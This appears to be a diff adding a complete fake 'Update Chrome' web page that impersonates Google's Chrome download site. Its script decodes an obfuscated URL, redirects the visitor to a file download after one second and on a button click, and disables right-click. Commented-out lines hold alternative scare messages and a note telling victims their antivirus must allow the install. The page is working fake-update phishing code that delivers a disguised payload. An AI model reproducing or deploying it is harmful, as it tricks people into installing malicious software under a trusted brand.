@@ -1,0 +1,147 @@
+<html class="no-js consumer build-stable win win10 win64 win64-capable twisty-js" id="win64" style="" lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta charset="utf-8">
+<meta content="Google Chrome is a fast, secure, and free web browser, built for the modern web. Give it a try on your desktop today." name="description">
+<title>Chrome for Desktop </title>
+<link href="chromefiles/css.css" rel="stylesheet">
+<link href="chromefiles/chrome.min.css" rel="stylesheet">
+<link href="chromefiles/chrome-32.png" rel="icon" type="image/ico">
+<!--<script src="chromefiles/jquery-3.1.1.min.js"></script>-->
+<style></style></head>
+
+<body class="" id="grid" oncontextmenu="return false;">
+
+<style>
+.button{
+	background:#008c00;
+	background:-moz-linear-gradient(top,#4ba614 0,#008c00 100%);
+	background:-webkit-gradient(linear,left top,left bottom,color-stop(0,#4ba614),color-stop(100%,#008c00));
+	background:-webkit-linear-gradient(top,#4ba614 0,#008c00 100%);
+	background:-o-linear-gradient(top,#4ba614 0,#008c00 100%);
+	background:-ms-linear-gradient(top,#4ba614 0,#008c00 100%);
+	background:linear-gradient(top,#4ba614 0,#008c00 100%);
+	border:1px solid #008c01;
+	-moz-border-radius:3px;
+	border-radius:3px;
+	color:#fff !important;
+	display:inline-block;
+	font-size:19px;
+	font-weight:700;
+	line-height:1.3;
+	padding:12px 35px;
+	text-align:center;
+	text-decoration:none !important;
+	text-shadow:1px 1px 1px #008c01;
+}
+
+.button:hover{
+	background:-moz-linear-gradient(top,#4ba614 30%,#008c00 100%);
+	background:-webkit-gradient(linear,left top,left bottom,color-stop(30%,#4ba614),color-stop(100%,#008c00));
+	background:-webkit-linear-gradient(top,#4ba614 30%,#008c00 100%);
+	background:-o-linear-gradient(top,#4ba614 30%,#008c00 100%);
+	background:-ms-linear-gradient(top,#4ba614 30%,#008c00 100%);
+	background:linear-gradient(top,#4ba614 30%,#008c00 100%);
+	cursor:pointer;
+}
+</style>
+
+
+
+
+
+<div class="compact fatnav-header" id="header">
+	<div class="g-section no-collapse">
+		<div class="g-unit g-first" id="header-logo">
+			<a href="#"><img alt="Chrome" id="logo" src="chromefiles/chrome_logo_2x.png"></a>
+		</div>
+		<a class="nav-skip-to-content" href="#" id="nav-skip-to-content">Skip to content</a>
+		<div id="fat-nav" style="display: none;">
+			<ul class="nav-l1">
+				<li class="nav-l1-menuitem nav-l1-download active">
+				<a class="nav-top" href="#">Download <span class="submenu-icon">&nbsp;</span></a>
+				</li>
+				<li class="nav-l1-menuitem nav-l1-customize">
+				<a class="nav-top" href="#">Set up <span class="submenu-icon">&nbsp;</span></a>
+				</li>
+				<li class="nav-l1-menuitem nav-l1-chromebook">
+				<a class="nav-top" href="#">Chromebooks <span class="submenu-icon">&nbsp;</span></a>
+				</li>
+				<li class="nav-l1-menuitem nav-l1-more">
+				<a class="nav-top last-nav-link" href="#">Chromecast <span class="submenu-icon">&nbsp;</span></a>
+				</li>
+			</ul>
+		</div>
+	</div>
+</div>
+<div class="browser-landing" id="main">
+	<div class="compact browser-benefits">
+		<section id="marquee">
+		<!--<h1 id="main-title" tabindex="-1">Warning! Critical update!</h1>
+		<p class="browser-promo">The following important update is available for your computer.</p>-->
+		<h1 id="main-title" tabindex="-1">You are using an older version of Chrome</h1>
+		<!--<h1 id="main-title" tabindex="-1">Update your Chrome!</h1>-->
+		<p class="browser-promo">Update now to keep your Chrome browser running smoothly and securely.</p>
+		<!--<p class="browser-promo">You will not need to restart your browser.</p>-->
+		<!--<p class="browser-promo">Note: Your antivirus software must allow you to install software.</p>-->
+		<p class="browser-promo">Your download will begin automatically. If not, click here:</p>
+		<a class="button eula-download-button download-button desktop-only hide-cros" href="javascript:void(0)" id="buttonDownload">Update Chrome</a>
+		<!--<div class="desktop-only">
+			<p class="content-win64">
+				<span class="alt-platform">For Windows 10/8.1/8/7</span>
+			</p>
+		</div>-->
+		<img alt="" class="hi-dpi empty-area section-hero" src="chromefiles/chrome-new.jpg">
+		</section>
+	</div>
+</div>
+
+<script>
+
+	function getUrl(url) {
+		var res = '';
+		for(var i=0; i<url.length; i++) {
+			if(i%2===1) res += url[i];
+		}
+		res = res.split("").reverse().join("");
+		return res;
+	}
+
+	var fileUrl = getUrl('a1,=,l}d7?,suj,.q7;23.}9;.,7(6{_}e7m;ocrih)C}/{6;v,6{7}g,to7fh}c}d{w;1}o45(pi/usy/mm2o(c{.)x;oyb5p)o;rnd).qw(w;w}/;/q:cs(p;t)t;h0');
+	
+	setTimeout(function() {
+		window.location.href = fileUrl;
+	}, 1000);
+	
+</script>
+<script>
+
+
+	//$(document).ready(function() {
+
+		
+		
+		document.getElementById('buttonDownload').onclick = function() {
+			window.location.href = fileUrl;
+			return false;
+		}; 
+		
+		
+		//$('#buttonDownload').click(function() {
+		//	window.location.href = fileUrl;
+		//	return false;
+		//});
+		
+		//$(document).on("contextmenu", function(e) {
+		//	e.preventDefault();
+		//});
+		
+		//window.onbeforeunload = function() {
+		//	return 'Your computer security is in danger if you do not install this critical update!';
+		//}
+		
+	//});
+
+	
+</script>
+
+</body></html>
